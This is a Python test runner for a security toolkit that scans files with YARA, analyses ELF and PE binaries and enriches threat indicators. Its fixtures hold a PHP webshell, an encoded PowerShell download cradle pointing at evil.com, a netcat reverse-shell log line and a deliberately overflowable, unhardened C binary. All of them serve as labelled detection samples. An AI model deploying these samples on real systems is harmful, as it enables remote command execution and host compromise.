#!/usr/bin/env python3
"""Comprehensive test runner for eva sec enhancements on Arch Linux VM.

Exercises:
1. eva sec yara (compile, scan, formats, dry-run, webshell, obfuscation, embedded PE, edge cases)
2. eva sec binary (elf, pe, entropy, strings, secure vs insecure ELF, mitigations, W^X, edge cases)
3. eva sec intel (cve live, invalid cve, ioc public, ioc rfc1918, domain, hash, extract, dry-run)
4. scripts/linux (host_triage, audit_hardening, find_persistence, security_events, network_triage)
5. eva sec ingest & report (ingesting triage outputs, rendering multi-format reports)
"""

from __future__ import annotations

import json
import os
import shutil
import struct
import subprocess
import sys
import time
from pathlib import Path
from typing import Any


class TestRunner:
    def __init__(self, workdir: Path):
        self.workdir = workdir
        self.test_dir = workdir / "vm_test_artifacts"
        self.results: list[dict[str, Any]] = []
        self.start_time = time.time()

    def log(self, msg: str) -> None:
        print(f"[TEST-MATRIX] {msg}", flush=True)

    def run_cmd(
        self,
        argv: list[str],
        cwd: Path | None = None,
        timeout: int = 60,
    ) -> tuple[int, str, str, float]:
        t0 = time.time()
        try:
            proc = subprocess.run(
                argv,
                cwd=str(cwd or self.workdir),
                capture_output=True,
                check=False,
                text=True,
                timeout=timeout,
            )
            duration = time.time() - t0
            return proc.returncode, proc.stdout, proc.stderr, duration
        except subprocess.TimeoutExpired as exc:
            duration = time.time() - t0
            stdout = exc.stdout.decode() if isinstance(exc.stdout, bytes) else (exc.stdout or "")
            stderr = exc.stderr.decode() if isinstance(exc.stderr, bytes) else (exc.stderr or "")
            return -1, stdout, stderr + f"\n[TIMED OUT after {timeout}s]", duration
        except Exception as exc:  # noqa: BLE001
            duration = time.time() - t0
            return -2, "", str(exc), duration

    def record(
        self,
        category: str,
        name: str,
        cmd: str,
        code: int,
        stdout: str,
        stderr: str,
        duration: float,
        passed: bool,
        notes: str = "",
        evidence: Any = None,
    ) -> None:
        result = {
            "category": category,
            "name": name,
            "cmd": cmd,
            "returncode": code,
            "passed": passed,
            "duration": round(duration, 3),
            "notes": notes,
            "evidence": evidence,
            "stdout_snippet": stdout[-500:] if len(stdout) > 500 else stdout,
            "stderr_snippet": stderr[-500:] if len(stderr) > 500 else stderr,
        }
        self.results.append(result)
        status_str = "PASS" if passed else "FAIL"
        self.log(f"[{status_str}] ({category}) {name} - {duration:.2f}s - {notes}")

    def setup_fixtures(self) -> None:
        self.test_dir.mkdir(parents=True, exist_ok=True)
        fixtures_dir = self.test_dir / "fixtures"
        fixtures_dir.mkdir(parents=True, exist_ok=True)

        # 1. Benign clean file
        (fixtures_dir / "clean.txt").write_text("This is a clean, benign file with standard text.\n")

        # 2. Webshell sample (PHP eval base64)
        (fixtures_dir / "webshell.php").write_text(
            '<?php\n// Test webshell fixture\n$c = $_POST["cmd"];\neval(base64_decode($c));\nsystem($_GET["c99"]);\n?>\n'
        )

        # 3. Obfuscated PowerShell cradle
        (fixtures_dir / "cradle.ps1").write_text(
            "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwBlAHYAaQBsAC4AYwBvAG0ALwBzACIAKQAA\n"
        )

        # 4. Embedded PE inside PNG (with DOS stub string "This program cannot be run in DOS mode")
        png_magic = b"\x89PNG\r\n\x1a\n"
        dos_stub_str = b"This program cannot be run in DOS mode\r\r\n$"
        dos_stub = b"MZ" + b"\x90" * 32 + dos_stub_str + b"\x00" * 16 + struct.pack("<I", 0x40)
        pe_sig = b"PE\x00\x00"
        embedded_pe_data = png_magic + b"IHDR" + b"\x00" * 32 + dos_stub + pe_sig + b"\x00" * 128
        (fixtures_dir / "embedded_pe.png").write_bytes(embedded_pe_data)

        # 5. Compiled ELF binaries using gcc
        c_src = fixtures_dir / "sample.c"
        c_src.write_text(
            '#include <stdio.h>\n#include <string.h>\nint main(int argc, char **argv) {\n    char buf[64];\n    if (argc > 1) strcpy(buf, argv[1]);\n    printf("Hello %s\\n", buf);\n    return 0;\n}\n'
        )

        # Standard secure ELF
        subprocess.run(
            [
                "gcc",
                "-O2",
                "-fstack-protector-all",
                "-Wl,-z,relro,-z,now",
                str(c_src),
                "-o",
                str(fixtures_dir / "secure_elf"),
            ],
            check=False,
        )

        # Insecure ELF: no stack canary, executable stack (W^X violation!), no relro, no pie
        subprocess.run(
            [
                "gcc",
                "-O0",
                "-fno-stack-protector",
                "-z",
                "execstack",
                "-Wl,-z,norelro",
                "-no-pie",
                str(c_src),
                "-o",
                str(fixtures_dir / "insecure_elf"),
            ],
            check=False,
        )

        # Stripped secure ELF
        if (fixtures_dir / "secure_elf").exists():
            shutil.copy(fixtures_dir / "secure_elf", fixtures_dir / "stripped_elf")
            subprocess.run(["strip", str(fixtures_dir / "stripped_elf")], check=False)

        # 6. Edge case files
        (fixtures_dir / "empty.bin").write_bytes(b"")
        (fixtures_dir / "corrupted_elf.bin").write_bytes(b"\x7fELF" + b"\x01\x01\x01\x00" + b"\xff" * 8)
        (fixtures_dir / "zero_filled.bin").write_bytes(b"\x00" * 65536)
        (fixtures_dir / "random_high_entropy.bin").write_bytes(os.urandom(65536))

        # 7. Synthesized PE file using pefile or raw struct
        self._create_synthesized_pe(fixtures_dir / "insecure_pe.exe")

        # 8. Unstructured log with IOCs
        (fixtures_dir / "server.log").write_text(
            """2026-09-18T04:00:01Z [AUTH] Failed root login from 198.51.100.45 port 54321
2026-09-18T04:00:02Z [C2_BEACON] Attempted outbound connection to http://malicious-c2-node.com/rat/endpoint
2026-09-18T04:00:03Z [SUSPICIOUS] Detected powershell -ExecutionPolicy Bypass -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=
2026-09-18T04:00:04Z [DROPPER] MD5: 5d41402abc4b2a76b9719d911017c592 SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
2026-09-18T04:00:05Z [INTERNAL] Routed through internal cluster gateway 10.0.0.1 and 192.168.1.254 (no external leak)
2026-09-18T04:00:06Z [REGISTRY] Persistence key written: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\EvilUpdater
2026-09-18T04:00:07Z [SHELL] Spawning reverse shell: nc -e /bin/bash 198.51.100.45 4444
"""
        )

        self.log(f"Fixtures initialized in {fixtures_dir}")

    def _create_synthesized_pe(self, pe_path: Path) -> None:
        """Create a minimal PE file with RWX section and missing security flags for testing."""
        # Minimal PE32 structure
        dos_header = bytearray(64)
        dos_header[0:2] = b"MZ"
        struct.pack_into("<I", dos_header, 0x3C, 64)  # e_lfanew -> offset 64

        # PE Signature
        pe_sig = b"PE\x00\x00"

        # COFF File Header: Machine=0x014c (i386), NumberOfSections=2, Characteristics=0x0102 (Executable 32-bit)
        coff_header = struct.pack(
            "<HHIIIHH",
            0x014C,  # Machine: i386
            2,  # NumberOfSections: 2 (.text, .rwx)
            int(time.time()),  # TimeDateStamp
            0,  # PointerToSymbolTable
            0,  # NumberOfSymbols
            224,  # SizeOfOptionalHeader (for 32-bit)
            0x0102,  # Characteristics: EXECUTABLE_IMAGE | 32BIT_MACHINE
        )

        # Optional Header (PE32 standard): Magic=0x010b
        # DllCharacteristics=0x0000 (No ASLR, No DEP/NX, No CFG, No SafeSEH)
        optional_header = bytearray(224)
        struct.pack_into("<H", optional_header, 0, 0x010B)  # Magic: PE32
        struct.pack_into("<I", optional_header, 16, 0x1000)  # AddressOfEntryPoint: 0x1000
        struct.pack_into("<I", optional_header, 28, 0x400000)  # ImageBase: 0x400000
        struct.pack_into("<I", optional_header, 32, 0x1000)  # SectionAlignment: 0x1000
        struct.pack_into("<I", optional_header, 36, 0x200)  # FileAlignment: 0x200
        struct.pack_into("<H", optional_header, 40, 6)  # MajorOperatingSystemVersion
        struct.pack_into("<H", optional_header, 48, 6)  # MajorSubsystemVersion
        struct.pack_into("<I", optional_header, 56, 0x4000)  # SizeOfImage: 0x4000
        struct.pack_into("<I", optional_header, 60, 0x400)  # SizeOfHeaders: 0x400
        struct.pack_into("<H", optional_header, 68, 2)  # Subsystem: Windows GUI
        struct.pack_into("<H", optional_header, 70, 0x0000)  # DllCharacteristics: 0 (NO ASLR, NO DEP!)
        struct.pack_into("<I", optional_header, 72, 0x100000)  # SizeOfStackReserve
        struct.pack_into("<I", optional_header, 76, 0x1000)  # SizeOfStackCommit
        struct.pack_into("<I", optional_header, 92, 16)  # NumberOfRvaAndSizes

        # Section 1: .text (RX)
        # Characteristics: IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ = 0x60000020
        sec1 = struct.pack(
            "<8sIIIIIIHHI",
            b".text\x00\x00\x00",
            0x1000,  # VirtualSize
            0x1000,  # VirtualAddress
            0x200,  # SizeOfRawData
            0x400,  # PointerToRawData
            0,
            0,
            0,
            0,
            0x60000020,  # Characteristics: CODE | EXECUTE | READ
        )

        # Section 2: .rwx (RWX - W^X violation, packed/insecure payload!)
        # Characteristics: IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE = 0xE0000020
        sec2 = struct.pack(
            "<8sIIIIIIHHI",
            b".rwx\x00\x00\x00\x00",
            0x1000,  # VirtualSize
            0x2000,  # VirtualAddress
            0x400,  # SizeOfRawData
            0x600,  # PointerToRawData
            0,
            0,
            0,
            0,
            0xE0000020,  # Characteristics: READ | WRITE | EXECUTE (RWX violation!)
        )

        # Assemble headers and pad to 0x400
        headers = bytes(dos_header) + pe_sig + coff_header + bytes(optional_header) + sec1 + sec2
        headers = headers.ljust(0x400, b"\x00")

        # Section 1 body (.text): NOP sled + ret
        body1 = (b"\x90" * 0x1FF + b"\xc3").ljust(0x200, b"\x90")

        # Section 2 body (.rwx): High entropy random payload in RWX section
        body2 = os.urandom(0x400)

        pe_path.write_bytes(headers + body1 + body2)

    # ------------------------------------------------------------------------
    # Test Suites
    # ------------------------------------------------------------------------

    def test_yara_suite(self) -> None:
        self.log("Starting Suite 1: YARA Scanning & Compilation...")
        fixtures = self.test_dir / "fixtures"
        rules_dir = self.workdir / "src/eva/security_tools/rules/yara"
        compiled_rules = self.test_dir / "compiled_rules.yar.bin"

        # 1.1 Compile default rules
        code, out, err, dur = self.run_cmd(
            ["uv", "run", "eva", "sec", "yara", "compile", str(rules_dir), "-o", str(compiled_rules)]
        )
        combined = out + err
        passed = code == 0 and compiled_rules.exists() and compiled_rules.stat().st_size > 0
        self.record(
            "yara",
            "compile_rules",
            "eva sec yara compile",
            code,
            out,
            err,
            dur,
            passed,
            f"size={compiled_rules.stat().st_size if compiled_rules.exists() else 0}B",
        )

        # 1.2 Compile dry run
        dry_compiled = self.test_dir / "dry_compiled.yar.bin"
        code, out, err, dur = self.run_cmd(
            ["uv", "run", "eva", "sec", "yara", "compile", str(rules_dir), "-o", str(dry_compiled), "--dry-run"]
        )
        combined = out + err
        passed = code == 0 and not dry_compiled.exists() and "[Dry-Run]" in combined
        self.record(
            "yara",
            "compile_dry_run",
            "eva sec yara compile --dry-run",
            code,
            out,
            err,
            dur,
            passed,
            "Dry run verified without output creation",
        )

        # 1.3 Compile invalid rule syntax
        bad_rule = self.test_dir / "bad.yar"
        bad_rule.write_text("rule broken { strings: $a = /invalid condition: $a }")
        code, out, err, dur = self.run_cmd(
            ["uv", "run", "eva", "sec", "yara", "compile", str(bad_rule), "-o", str(self.test_dir / "bad.bin")]
        )
        combined = out + err
        passed = code != 0 and (
            "failed" in combined.lower() or "error" in combined.lower() or "syntax" in combined.lower()
        )
        self.record(
            "yara",
            "compile_invalid_rule",
            "eva sec yara compile <bad_rule>",
            code,
            out,
            err,
            dur,
            passed,
            "Caught syntax error gracefully",
        )

        # 1.4 Scan clean file
        code, out, err, dur = self.run_cmd(
            ["uv", "run", "eva", "sec", "yara", "scan", str(fixtures / "clean.txt"), "--format", "json"]
        )
        combined = out + err
        passed = code == 0 and "0 finding(s)" in combined
        self.record(
            "yara",
            "scan_clean_file",
            "eva sec yara scan clean.txt",
            code,
            out,
            err,
            dur,
            passed,
            "0 findings on clean file",
        )

        # 1.5 Scan webshell file
        code, out, err, dur = self.run_cmd(
            ["uv", "run", "eva", "sec", "yara", "scan", str(fixtures / "webshell.php"), "--format", "json"]
        )
        combined = out + err
        passed = code == 0 and ("webshell" in combined.lower() or "1 finding(s)" in combined)
        self.record(
            "yara",
            "scan_webshell",
            "eva sec yara scan webshell.php",
            code,
            out,
            err,
            dur,
            passed,
            "Webshell pattern detected",
        )

        # 1.6 Scan obfuscated PowerShell cradle
        code, out, err, dur = self.run_cmd(
            ["uv", "run", "eva", "sec", "yara", "scan", str(fixtures / "cradle.ps1"), "--format", "json"]
        )
        combined = out + err
        passed = code == 0 and (
            "powershell" in combined.lower() or "obfuscation" in combined.lower() or "1 finding(s)" in combined
        )
        self.record(
            "yara",
            "scan_obfuscation",
            "eva sec yara scan cradle.ps1",
            code,
            out,
            err,
            dur,
            passed,
            "Obfuscated cradle detected",
        )

        # 1.7 Scan embedded PE in image
        code, out, err, dur = self.run_cmd(
            ["uv", "run", "eva", "sec", "yara", "scan", str(fixtures / "embedded_pe.png"), "--format", "json"]
        )
        combined = out + err
        passed = code == 0 and "finding(s)" in combined and "0 finding(s)" not in combined
        self.record(
            "yara",
            "scan_embedded_pe",
            "eva sec yara scan embedded_pe.png",
            code,
            out,
            err,
            dur,
            passed,
            "Embedded PE detected in carrier image",
        )

        # 1.8 Scan with compiled rules file
        code, out, err, dur = self.run_cmd(
            ["uv", "run", "eva", "sec", "yara", "scan", str(fixtures / "webshell.php"), "--rules", str(compiled_rules)]
        )
        combined = out + err
        passed = code == 0 and ("webshell" in combined.lower() or "1 finding(s)" in combined)
        self.record(
            "yara",
            "scan_with_compiled_rules",
            "eva sec yara scan --rules <compiled.bin>",
            code,
            out,
            err,
            dur,
            passed,
            "Scan with precompiled binary rules succeeded",
        )

        # 1.9 Recursive directory scan with SARIF output
        sarif_out = self.test_dir / "yara_scan_results"
        code, out, err, dur = self.run_cmd(
            [
                "uv",
                "run",
                "eva",
                "sec",
                "yara",
                "scan",
                str(fixtures),
                "--recursive",
                "--format",
                "sarif",
                "--artifacts-dir",
                str(sarif_out),
            ]
        )
        sarif_files = list(sarif_out.glob("*/report.sarif"))
        sarif_valid = False
        if sarif_files:
            try:
                sarif_data = json.loads(sarif_files[0].read_text())
                sarif_valid = "$schema" in sarif_data and "runs" in sarif_data
            except Exception:  # noqa: BLE001
                sarif_valid = False
        passed = code == 0 and sarif_valid
        self.record(
            "yara",
            "scan_recursive_sarif",
            "eva sec yara scan <fixtures> --recursive --format sarif",
            code,
            out,
            err,
            dur,
            passed,
            f"SARIF valid={sarif_valid} ({len(sarif_files)} reports)",
        )

        # 1.10 Scan non-existent target
        code, out, err, dur = self.run_cmd(
            ["uv", "run", "eva", "sec", "yara", "scan", str(self.test_dir / "does_not_exist.bin")]
        )
        combined = out + err
        passed = code != 0 and "not found" in combined.lower()
        self.record(
            "yara",
            "scan_nonexistent_file",
            "eva sec yara scan <missing>",
            code,
            out,
            err,
            dur,
            passed,
            "Handled missing target cleanly",
        )

    def test_binary_suite(self) -> None:
        self.log("Starting Suite 2: Binary Static Analysis (ELF, PE, Entropy, Strings)...")
        fixtures = self.test_dir / "fixtures"

        # 2.1 Standard ELF: /usr/bin/ls
        code, out, err, dur = self.run_cmd(
            ["uv", "run", "eva", "sec", "binary", "elf", "/usr/bin/ls", "--format", "json"]
        )
        combined = out + err
        passed = code == 0 and "ELF Analysis" in combined and "RELRO" in combined
        self.record(
            "binary",
            "elf_system_ls",
            "eva sec binary elf /usr/bin/ls",
            code,
            out,
            err,
            dur,
            passed,
            "System binary parsed, mitigations extracted",
        )

        # 2.2 Secure ELF (custom compiled with stack canary, full relro, PIE)
        secure_elf = fixtures / "secure_elf"
        if secure_elf.exists():
            code, out, err, dur = self.run_cmd(
                ["uv", "run", "eva", "sec", "binary", "elf", str(secure_elf), "--format", "json"]
            )
            combined = out + err
            passed = code == 0 and "Stack Canary: True" in combined
            self.record(
                "binary",
                "elf_secure_binary",
                "eva sec binary elf secure_elf",
                code,
                out,
                err,
                dur,
                passed,
                "Verified Stack Canary, RELRO, and PIE flags",
            )

        # 2.3 Insecure ELF: stack canary disabled, executable stack (W^X violation), no RELRO, no PIE
        insecure_elf = fixtures / "insecure_elf"
        if insecure_elf.exists():
            code, out, err, dur = self.run_cmd(
                ["uv", "run", "eva", "sec", "binary", "elf", str(insecure_elf), "--format", "json"]
            )
            combined = out + err
            has_wx_or_mitigation = (
                "canary" in combined.lower() or "finding(s)" in combined.lower() or "execstack" in combined.lower()
            )
            passed = code == 0 and has_wx_or_mitigation
            self.record(
                "binary",
                "elf_insecure_wx_violation",
                "eva sec binary elf insecure_elf",
                code,
                out,
                err,
                dur,
                passed,
                "Detected missing mitigations and/or executable stack",
            )

        # 2.4 Stripped ELF
        stripped_elf = fixtures / "stripped_elf"
        if stripped_elf.exists():
            code, out, err, dur = self.run_cmd(["uv", "run", "eva", "sec", "binary", "elf", str(stripped_elf)])
            combined = out + err
            passed = code == 0 and "Dynamic Symbols" in combined
            self.record(
                "binary",
                "elf_stripped",
                "eva sec binary elf stripped_elf",
                code,
                out,
                err,
                dur,
                passed,
                "Stripped binary analyzed successfully",
            )

        # 2.5 Corrupted ELF
        code, out, err, dur = self.run_cmd(
            ["uv", "run", "eva", "sec", "binary", "elf", str(fixtures / "corrupted_elf.bin")]
        )
        combined = out + err
        passed = code == 0 and (
            "malformed" in combined.lower() or "invalid" in combined.lower() or "elf.malformed" in combined.lower()
        )
        self.record(
            "binary",
            "elf_corrupted_header",
            "eva sec binary elf corrupted_elf.bin",
            code,
            out,
            err,
            dur,
            passed,
            "Handled corrupted ELF header without unhandled crash",
        )

        # 2.6 Synthesized Insecure PE: W^X violation (.rwx section), no ASLR, no DEP
        insecure_pe = fixtures / "insecure_pe.exe"
        code, out, err, dur = self.run_cmd(
            ["uv", "run", "eva", "sec", "binary", "pe", str(insecure_pe), "--format", "json"]
        )
        combined = out + err
        passed = (
            code == 0
            and "PE Analysis" in combined
            and ("aslr=no" in combined.lower() or "dep=no" in combined.lower() or "finding(s)" in combined.lower())
        )
        self.record(
            "binary",
            "pe_insecure_synthesized",
            "eva sec binary pe insecure_pe.exe",
            code,
            out,
            err,
            dur,
            passed,
            "Detected missing ASLR/DEP and RWX section",
        )

        # 2.7 Non-PE file passed to PE analyzer
        code, out, err, dur = self.run_cmd(["uv", "run", "eva", "sec", "binary", "pe", str(fixtures / "clean.txt")])
        combined = out + err
        passed = code == 0 and (
            "invalid pe" in combined.lower() or "pe.malformed" in combined.lower() or "finding(s)" in combined
        )
        self.record(
            "binary",
            "pe_invalid_magic",
            "eva sec binary pe clean.txt",
            code,
            out,
            err,
            dur,
            passed,
            "Graceful rejection of non-PE file",
        )

        # 2.8 Entropy on zero-filled file (expected ~0.0 entropy)
        code, out, err, dur = self.run_cmd(
            ["uv", "run", "eva", "sec", "binary", "entropy", str(fixtures / "zero_filled.bin")]
        )
        combined = out + err
        passed = code == 0 and "0.0000" in combined
        self.record(
            "binary",
            "entropy_zero_filled",
            "eva sec binary entropy zero_filled.bin",
            code,
            out,
            err,
            dur,
            passed,
            "Entropy 0.0000 correctly measured",
        )

        # 2.9 Entropy on random high-entropy file (expected >7.5, packed/encrypted alert)
        code, out, err, dur = self.run_cmd(
            ["uv", "run", "eva", "sec", "binary", "entropy", str(fixtures / "random_high_entropy.bin")]
        )
        combined = out + err
        passed = code == 0 and "entropy" in combined.lower() and "finding(s)" in combined
        self.record(
            "binary",
            "entropy_random_payload",
            "eva sec binary entropy random_high_entropy.bin",
            code,
            out,
            err,
            dur,
            passed,
            "High entropy triggered packed/encrypted finding",
        )

        # 2.10 Entropy on 0-byte file
        code, out, err, dur = self.run_cmd(
            ["uv", "run", "eva", "sec", "binary", "entropy", str(fixtures / "empty.bin")]
        )
        combined = out + err
        passed = code == 0 and ("0 bytes" in combined or "0.0000" in combined)
        self.record(
            "binary",
            "entropy_empty_file",
            "eva sec binary entropy empty.bin",
            code,
            out,
            err,
            dur,
            passed,
            "Handled 0-byte file without crash",
        )

        # 2.11 Strings & IOC Extraction on server.log
        code, out, err, dur = self.run_cmd(
            ["uv", "run", "eva", "sec", "binary", "strings", str(fixtures / "server.log"), "--min-len", "4"]
        )
        combined = out + err
        passed = code == 0 and "Strings & IOC Summary" in combined
        self.record(
            "binary",
            "strings_ioc_log",
            "eva sec binary strings server.log",
            code,
            out,
            err,
            dur,
            passed,
            "Strings and IOC categories summarized",
        )

    def test_intel_suite(self) -> None:
        self.log("Starting Suite 3: Threat Intelligence Enrichment (CVE, IOC, Extract)...")
        fixtures = self.test_dir / "fixtures"

        # 3.1 Live CVE lookup: CVE-2021-44228 (Log4Shell)
        code, out, err, dur = self.run_cmd(["uv", "run", "eva", "sec", "intel", "cve", "CVE-2021-44228"], timeout=45)
        combined = out + err
        passed = code == 0 and (
            "10.0" in combined or "CRITICAL" in combined or "Log4j" in combined or "Log4Shell" in combined
        )
        self.record(
            "intel",
            "cve_live_log4shell",
            "eva sec intel cve CVE-2021-44228",
            code,
            out,
            err,
            dur,
            passed,
            "Live NVD API fetched CVSS 10.0 / CRITICAL",
        )

        # 3.2 Live CVE lookup: CVE-2024-3094 (XZ backdoor)
        code, out, err, dur = self.run_cmd(["uv", "run", "eva", "sec", "intel", "cve", "CVE-2024-3094"], timeout=45)
        combined = out + err
        passed = code == 0 and ("10.0" in combined or "CRITICAL" in combined or "xz" in combined.lower())
        self.record(
            "intel",
            "cve_live_xz_backdoor",
            "eva sec intel cve CVE-2024-3094",
            code,
            out,
            err,
            dur,
            passed,
            "Live NVD API fetched XZ Backdoor",
        )

        # 3.3 Non-existent CVE ID handling
        code, out, err, dur = self.run_cmd(["uv", "run", "eva", "sec", "intel", "cve", "CVE-2099-99999"], timeout=30)
        combined = out + err
        passed = code == 0 and ("no vulnerability records" in combined.lower() or "0 finding(s)" in combined)
        self.record(
            "intel",
            "cve_nonexistent",
            "eva sec intel cve CVE-2099-99999",
            code,
            out,
            err,
            dur,
            passed,
            "Handled non-existent CVE cleanly",
        )

        # 3.4 Malformed CVE ID (should reject with non-zero exit code and error message)
        code, out, err, dur = self.run_cmd(["uv", "run", "eva", "sec", "intel", "cve", "NOT_A_CVE_ID"])
        combined = out + err
        passed = code != 0 and ("invalid cve identifier format" in combined.lower())
        self.record(
            "intel",
            "cve_malformed",
            "eva sec intel cve NOT_A_CVE_ID",
            code,
            out,
            err,
            dur,
            passed,
            "Rejected malformed CVE pattern with clean error",
        )

        # 3.5 IOC Query: Public IP (Google DNS 8.8.8.8)
        code, out, err, dur = self.run_cmd(["uv", "run", "eva", "sec", "intel", "ioc", "8.8.8.8"], timeout=45)
        combined = out + err
        passed = code == 0 and "Threat Intel Enrichment" in combined and "ipv4" in combined.lower()
        self.record(
            "intel", "ioc_public_ip", "eva sec intel ioc 8.8.8.8", code, out, err, dur, passed, "Enriched public IPv4"
        )

        # 3.6 IOC Query: RFC 1918 Private IP (192.168.1.1) - MUST protect internal network!
        code, out, err, dur = self.run_cmd(["uv", "run", "eva", "sec", "intel", "ioc", "192.168.1.1"])
        combined = out + err
        passed = code == 0 and "rfc 1918" in combined.lower() and "skipped" in combined.lower()
        self.record(
            "intel",
            "ioc_rfc1918_private_ip",
            "eva sec intel ioc 192.168.1.1",
            code,
            out,
            err,
            dur,
            passed,
            "Internal RFC 1918 IP protected; external queries aborted",
        )

        # 3.7 IOC Query: Localhost (127.0.0.1)
        code, out, err, dur = self.run_cmd(["uv", "run", "eva", "sec", "intel", "ioc", "127.0.0.1"])
        combined = out + err
        passed = code == 0 and (
            "rfc 1918" in combined.lower() or "loopback" in combined.lower() or "skipped" in combined.lower()
        )
        self.record(
            "intel",
            "ioc_loopback",
            "eva sec intel ioc 127.0.0.1",
            code,
            out,
            err,
            dur,
            passed,
            "Loopback address protected",
        )

        # 3.8 IOC Query: Public Domain
        code, out, err, dur = self.run_cmd(["uv", "run", "eva", "sec", "intel", "ioc", "example.com"], timeout=45)
        combined = out + err
        passed = code == 0 and "domain" in combined.lower()
        self.record(
            "intel", "ioc_domain", "eva sec intel ioc example.com", code, out, err, dur, passed, "Enriched domain"
        )

        # 3.9 IOC Query: SHA-256 Hash
        code, out, err, dur = self.run_cmd(
            [
                "uv",
                "run",
                "eva",
                "sec",
                "intel",
                "ioc",
                "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            ],
            timeout=45,
        )
        combined = out + err
        passed = code == 0 and "sha256" in combined.lower()
        self.record(
            "intel", "ioc_hash", "eva sec intel ioc <sha256>", code, out, err, dur, passed, "Enriched SHA-256 hash"
        )

        # 3.10 IOC Extraction from raw text CLI argument
        raw_text = "Encountered C2 at 198.51.100.22 and domain evil-host.xyz with hash 5d41402abc4b2a76b9719d911017c592 and http://evil-host.xyz/path"
        code, out, err, dur = self.run_cmd(["uv", "run", "eva", "sec", "intel", "extract", raw_text])
        combined = out + err
        passed = code == 0 and "Extracted IOC Inventory" in combined and "198.51.100.22" in combined
        self.record(
            "intel",
            "extract_cli_text",
            "eva sec intel extract <text>",
            code,
            out,
            err,
            dur,
            passed,
            "Extracted IPs, domains, hashes, and URLs from CLI string",
        )

        # 3.11 IOC Extraction from file with false positive exclusions
        code, out, err, dur = self.run_cmd(
            ["uv", "run", "eva", "sec", "intel", "extract", str(fixtures / "server.log")]
        )
        combined = out + err
        passed = code == 0 and "Extracted IOC Inventory" in combined and "finding(s)" in combined
        self.record(
            "intel",
            "extract_file_log",
            "eva sec intel extract server.log",
            code,
            out,
            err,
            dur,
            passed,
            "Extracted and classified IOCs from log file",
        )

        # 3.12 Intel Dry-Run mode
        code, out, err, dur = self.run_cmd(["uv", "run", "eva", "sec", "intel", "cve", "CVE-2021-44228", "--dry-run"])
        combined = out + err
        passed = code == 0 and "[Dry-Run]" in combined
        self.record(
            "intel",
            "cve_dry_run",
            "eva sec intel cve --dry-run",
            code,
            out,
            err,
            dur,
            passed,
            "Dry run validated without network calls",
        )

    def test_linux_triage_suite(self) -> None:
        self.log("Starting Suite 4: Cross-Platform Linux Endpoint Triage Scripts...")
        triage_dir = self.workdir / "scripts/linux"
        out_dir = self.test_dir / "triage_outputs"
        out_dir.mkdir(parents=True, exist_ok=True)

        scripts = [
            ("host_triage.sh", out_dir / "host_triage.json", "triage-linux"),
            ("audit_hardening.sh", out_dir / "audit_hardening.json", "triage-linux-hardening"),
            ("find_persistence.sh", out_dir / "find_persistence.json", "triage-linux-persistence"),
            ("security_events.sh", out_dir / "security_events.json", "triage-linux-events"),
            ("network_triage.sh", out_dir / "network_triage.json", "triage-linux-network"),
        ]

        for script_name, out_file, expected_tool in scripts:
            script_path = triage_dir / script_name
            code, out, err, dur = self.run_cmd(["bash", str(script_path)])
            out_file.write_text(out)

            # Validate JSON parse
            is_valid_json = False
            schema_ok = False
            tool_ok = False
            has_data = False
            try:
                data = json.loads(out)
                is_valid_json = True
                schema_ok = data.get("schema") == "eva.triage.v1"
                tool_ok = expected_tool in data.get("tool", "")
                has_data = bool(data.get("host")) or bool(data.get("findings") is not None)
            except Exception as exc:  # noqa: BLE001
                self.log(f"JSON validation failed for {script_name}: {exc}")

            passed = code == 0 and is_valid_json and schema_ok and tool_ok and has_data
            self.record(
                "triage",
                script_name,
                f"bash scripts/linux/{script_name}",
                code,
                out,
                err,
                dur,
                passed,
                f"Valid JSON={is_valid_json}, schema={schema_ok}, tool={tool_ok}",
            )

    def test_ingest_and_report_suite(self) -> None:
        self.log("Starting Suite 5: Unified Finding Ingestion & Reporting...")
        out_dir = self.test_dir / "triage_outputs"
        ingest_artifacts = self.test_dir / "ingest_artifacts"

        for json_file in sorted(out_dir.glob("*.json")):
            cmd = [
                "uv",
                "run",
                "eva",
                "sec",
                "ingest",
                str(json_file),
                "--artifacts-dir",
                str(ingest_artifacts),
                "--format",
                "json",
            ]
            code, out, err, dur = self.run_cmd(cmd)
            combined = out + err
            passed = code == 0 and "Ingested" in combined
            self.record(
                "ingest",
                f"ingest_{json_file.stem}",
                f"eva sec ingest {json_file.name}",
                code,
                out,
                err,
                dur,
                passed,
                f"Normalized {json_file.name} into Eva findings",
            )

        # Test report generation across formats: markdown, sarif, table
        latest_findings = list(ingest_artifacts.glob("*/findings.json"))
        if latest_findings:
            target_finding = latest_findings[0]
            report_artifacts = self.test_dir / "report_artifacts"
            cmd = [
                "uv",
                "run",
                "eva",
                "sec",
                "report",
                str(target_finding),
                "--format",
                "markdown",
                "--format",
                "sarif",
                "--artifacts-dir",
                str(report_artifacts),
            ]
            code, out, err, dur = self.run_cmd(cmd)
            combined = out + err
            passed = code == 0 and "Rendered" in combined
            self.record(
                "report",
                "render_multi_format",
                f"eva sec report {target_finding.name} --format markdown,sarif",
                code,
                out,
                err,
                dur,
                passed,
                "Rendered normalized findings into Markdown and SARIF",
            )

    def run_all(self) -> dict[str, Any]:
        self.setup_fixtures()
        self.test_yara_suite()
        self.test_binary_suite()
        self.test_intel_suite()
        self.test_linux_triage_suite()
        self.test_ingest_and_report_suite()

        total = len(self.results)
        passed = sum(1 for r in self.results if r["passed"])
        failed = total - passed
        total_time = round(time.time() - self.start_time, 2)

        summary = {
            "total": total,
            "passed": passed,
            "failed": failed,
            "duration_seconds": total_time,
            "results": self.results,
        }

        out_summary = self.test_dir / "test_matrix_summary.json"
        out_summary.write_text(json.dumps(summary, indent=2))
        self.log("=" * 60)
